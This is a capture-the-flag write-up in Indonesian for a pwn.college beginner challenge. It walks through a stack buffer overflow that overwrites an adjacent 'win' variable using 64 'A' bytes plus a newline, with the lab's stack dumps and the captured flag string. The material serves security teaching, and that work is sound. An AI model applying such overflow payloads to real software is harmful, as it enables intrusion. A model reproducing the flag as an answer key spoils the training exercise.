```
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ ./binary-exploitation-first-overflow-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffefd24ca80 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24ca88 (rsp+0x0008) | 48 dc 24 fd fe 7f 00 00 | 0x00007ffefd24dc48 |
| 0x00007ffefd24ca90 (rsp+0x0010) | 38 dc 24 fd fe 7f 00 00 | 0x00007ffefd24dc38 |
| 0x00007ffefd24ca98 (rsp+0x0018) | 25 45 9e ec 01 00 00 00 | 0x00000001ec9e4525 |
| 0x00007ffefd24caa0 (rsp+0x0020) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffefd24caa8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cab0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cab8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cac0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cac8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cad0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cad8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cae0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24cae8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24caf0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24caf8 (rsp+0x0078) | 00 e4 54 a7 71 94 42 91 | 0x91429471a754e400 |
| 0x00007ffefd24cb00 (rsp+0x0080) | 40 db 24 fd fe 7f 00 00 | 0x00007ffefd24db40 |
| 0x00007ffefd24cb08 (rsp+0x0088) | 12 1f 40 00 00 00 00 00 | 0x0000000000401f12 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffefd24ca80, and our base pointer points to 0x7ffefd24cb00.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffefd24cab0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 63 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffefd24caf0, 64 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffefd24cab0 (the start of the input buffer)
right up to (but not including) 0x7ffefd24dab0 (which is 4033 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!

```

Disini kita diminta untuk melakukan exploitasi pada kerentanan buffer overflow sederhana. Dari deskripsi sudah diperlihatkan kalau alamat input buffer kita ada di alamat: **0x7ffefd24cab0**

Lalu untuk win variable yang mana itu adalah flagnya, ada di alamat **0x7ffefd24caf0**

Selisih alamat input buffer kita dengan win variable (0x7ffefd24cab0 - 0x7ffefd24caf0) adalah 0x40 atau jika dalam byte adalah 64 byte. Artinya butuh 64 byte buffer agar bisa mencapai alamat dari win variable. Jika dilihat dari source code C yang ada

```
int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[63];
        int win_variable;
    } data  = {0} ;
...

    if (data.win_variable)
    {
        win();
    }
```

Diperlihatkan kalau buffer kita berukuran 64 bytes (0-63). Ditambah dengan \n atau 0x0a atau 10 dalam decimal yang akhirnya mengisi nilai dari win_variable dengan buffer overflow. Karena saat ini win_variable mempunyai nilai atau != 0, maka flag akan tercetak. Sebagai contoh:

```
Send your payload (up to 4096 bytes)!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You sent 65 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffefd24ca80 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffefd24ca88 (rsp+0x0008) | 48 dc 24 fd fe 7f 00 00 | 0x00007ffefd24dc48 |
| 0x00007ffefd24ca90 (rsp+0x0010) | 38 dc 24 fd fe 7f 00 00 | 0x00007ffefd24dc38 |
| 0x00007ffefd24ca98 (rsp+0x0018) | 25 45 9e ec 01 00 00 00 | 0x00000001ec9e4525 |
| 0x00007ffefd24caa0 (rsp+0x0020) | 00 10 00 00 41 00 00 00 | 0x0000004100001000 |
| 0x00007ffefd24caa8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffefd24cab0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24cab8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24cac0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24cac8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24cad0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24cad8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24cae0 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24cae8 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffefd24caf0 (rsp+0x0070) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007ffefd24caf8 (rsp+0x0078) | 00 e4 54 a7 71 94 42 91 | 0x91429471a754e400 |
| 0x00007ffefd24cb00 (rsp+0x0080) | 40 db 24 fd fe 7f 00 00 | 0x00007ffefd24db40 |
| 0x00007ffefd24cb08 (rsp+0x0088) | 12 1f 40 00 00 00 00 00 | 0x0000000000401f12 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffefd24cab0
- the saved frame pointer (of main) is at 0x7ffefd24cb00
- the saved return address (previously to main) is at 0x7ffefd24cb08
- the saved return address is now pointing to 0x401f12.
- the canary is stored at 0x7ffefd24caf8.
- the canary value is now 0x91429471a754e400.
- the address of the win variable is 0x7ffefd24caf0.
- the value of the win variable is 0xa.

You win! Here is your flag:
pwn.college{8qlKCYf8FfZLjE8JcQBoWjTl0a_.dlDOywSO1IzNzEzW}


Goodbye!

```

Disini aku mengisi buffer input sebanyak 64 char "A" yang bernilai masing-masing 1 byte. Alhasil ditambah dengan enter (/n) nilai dari win variable di address 0x7ffefd24caf0 terisi. Dijelaskan dengan status: 

**- the value of the win variable is 0xa.**

Namun kita tidak harus mengisi pas 64 bytes data, karena input buffer kita tidak dibatasi jadi ketika kita input >= 64 bytes data pun flag akan keluar karena syarat flag ter print-out adalah win_variable !=0 atau memiliki value.

**Flag: pwn.college{8qlKCYf8FfZLjE8JcQBoWjTl0a_.dlDOywSO1IzNzEzW}**
